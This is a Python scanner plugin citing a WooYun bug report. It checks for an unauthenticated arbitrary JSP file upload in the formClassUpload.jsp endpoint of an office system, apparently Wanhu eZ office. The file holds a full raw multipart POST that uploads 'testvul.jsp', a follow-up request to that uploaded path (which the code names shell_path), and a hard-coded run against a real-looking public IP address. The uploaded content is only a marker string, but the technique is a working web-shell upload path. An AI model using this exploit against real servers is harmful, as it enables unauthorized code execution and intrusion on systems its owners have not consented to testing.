#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0137140
#__Author__ = 上善若水
#_PlugName_ = whezeip Plugin
#_FileName_ = whezeip.py


def assign(service, arg):
    if service == "whezeip":
        return True, arg 	

def audit(arg):
    raw = '''
POST /defaultroot/customize/formClassUpload.jsp?flag=1&returnField=null HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: 127.0.0.1/defaultroot/customize/formClassUpload.jsp
Cookie: LocLan=zh_cn; JSESSIONID=zXP1WqCc0h80FSvJNVdnj1fGpTJfh2GphR5GYJnJGLLKKKtJdGJN!-668245681
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------11327923318636
Content-Length: 328

-----------------------------11327923318636
Content-Disposition: form-data; name="photo"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_uploadfile_test
-----------------------------11327923318636
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------11327923318636--

    '''
    url = arg + 'defaultroot/customize/formClassUpload.jsp?flag=1&returnField=null'
    # proxy=('127.0.0.1',1234)
    # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
    code1, head1, res1, errcode1, _url1 = curl.curl2(url,raw=raw)
    shell_path = 'defaultroot/devform/customize/' + 'testvul.jsp'
    code2, head2, res2, errcode2, _url2 = curl.curl2(arg+shell_path)
    if code2 == 200 and 'testvul_uploadfile_test' in res2: 
        security_hole(url)
            
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('whezeip', 'http://218.104.147.71:7001/')[1])